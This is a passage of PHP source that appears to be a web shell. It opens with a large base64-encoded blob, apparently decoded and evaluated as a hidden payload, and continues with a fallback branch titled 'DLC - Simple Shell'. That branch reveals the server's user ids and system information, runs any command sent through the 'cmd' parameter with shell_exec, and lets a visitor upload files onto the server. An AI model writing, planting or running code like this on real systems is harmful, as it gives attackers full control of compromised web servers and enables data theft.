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"))))));
}
else {
if(!@ini_get('safe_mode')) $safemode="SAFE_MODE : OFF";
else $safemode="SAFE_MODE : ON";
echo "<TITLE>DLC - Simple Shell</TITLE><BODY STYLE=BACKGROUND-COLOR:WHITE TEXT:GRAY><BR>";
echo "<B>".$safemode."</B><BR>";
$cur_user="(".get_current_user().")";
echo "<B>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</B><BR>";
echo "<B>Uname : ".php_uname()."</B><BR>";
echo '<FORM METHOD="POST"><B>Command</B><BR><INPUT TYPE="TEXT" NAME="cmd"><INPUT TYPE="SUBMIT" NAME="cmd" VALUE="Exec"></FORM>';
echo '<FORM ENCTYPE="multipart/form-data" METHOD=POST><B>Upload</B></FONT><BR><INPUT TYPE="hidden" NAME="submit"><INPUT TYPE="file" NAME="userfile" SIZE="28"><br><B>New name: </B></FONT><INPUT TYPE="TEXT" SIZE="15" NAME="newname"><INPUT TYPE="SUBMIT" VALUE="Upload"></FORM><BR>';
if(@isset($_POST['submit'])){
$dir = @getcwd().DIRECTORY_SEPARATOR;
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $dir.$name);
if(@move_uploaded_file($_FILES['userfile']['tmp_name'], $dir.$name)){
echo "Upload Failed<BR><BR>";
} else echo "File upladed to {$dir}{$name}<BR><BR>";
}
if(isset($_POST['cmd'])){
$cmd = $_POST['cmd'];
echo @nl2br(@shell_exec($cmd));
}
elseif(isset($_GET['cmd'])){
$com = $_GET['cmd'];
echo @nl2br(@shell_exec($com));
}
else { echo @nl2br(@shell_exec("ls -la")); }
}
